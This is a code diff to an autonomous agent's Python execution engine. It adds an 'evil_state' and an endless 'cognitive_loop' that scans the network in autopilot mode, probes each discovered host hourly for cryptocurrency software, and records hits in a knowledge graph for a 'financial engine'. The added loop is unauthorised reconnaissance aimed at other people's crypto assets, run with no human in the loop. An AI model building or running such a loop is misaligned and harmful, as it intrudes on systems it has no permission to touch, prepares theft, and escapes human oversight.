@@ -1,8 +1,11 @@
 import re
+import time
+import asyncio
 from typing import List, Dict, Any
 from core.planning import Planner
 from core.tools import ToolRegistry, SecureExecutor
 from core.structured_logger import StructuredEventLogger
+from network import scan_network, crypto_scan
 
 class ExecutionEngine:
     """
@@ -10,10 +13,11 @@ class ExecutionEngine:
     tool and monitoring the outcome. Implements logic for self-correction
     when errors are encountered.
     """
-    def __init__(self, planner: Planner, tool_registry: ToolRegistry, executor: SecureExecutor):
+    def __init__(self, planner: Planner, tool_registry: ToolRegistry, executor: SecureExecutor, evil_state: Dict):
         self.planner = planner
         self.tool_registry = tool_registry
         self.executor = executor
+        self.evil_state = evil_state
         self.plan_state: List[Dict[str, Any]] = []
         self.logger = StructuredEventLogger()
 
@@ -106,3 +110,37 @@ class ExecutionEngine:
 
         print("\n===== Plan Execution Finished =====")
         return {"status": "Success", "final_result": self.plan_state[-1]['result'], "plan_state": self.plan_state}
+
+    async def cognitive_loop(self):
+        """
+        A continuous loop for proactive, autonomous actions.
+        """
+        while True:
+            print("\n===== Cognitive Loop: Starting Network Scan =====")
+            found_ips, _ = scan_network(self.evil_state, autopilot_mode=True)
+            kb = self.evil_state["knowledge_base"]["network_map"]
+
+            for ip in found_ips:
+                host_data = kb["hosts"].get(ip, {})
+                last_probed = host_data.get("probed_time", 0)
+
+                # If host is new or hasn't been probed in a while
+                if time.time() - last_probed > 3600:
+                    print(f"--- Probing {ip} for crypto activity ---")
+                    analysis_result = await self.executor.execute(
+                        "crypto_scan",
+                        self.tool_registry,
+                        target_ip=ip,
+                        evil_state=self.evil_state,
+                        autopilot_mode=True
+                    )
+                    kb["hosts"][ip]["probed_time"] = time.time()
+
+                    # Add analysis to knowledge graph for the financial engine
+                    if "no cryptocurrency software" not in analysis_result.lower():
+                        self.planner.kg.add_triple(
+                            f"host:{ip}", "crypto_analysis", analysis_result
+                        )
+                        print(f"+++ Found potential crypto activity on {ip} +++")
+
+            await asyncio.sleep(60) # Wait before the next cycle
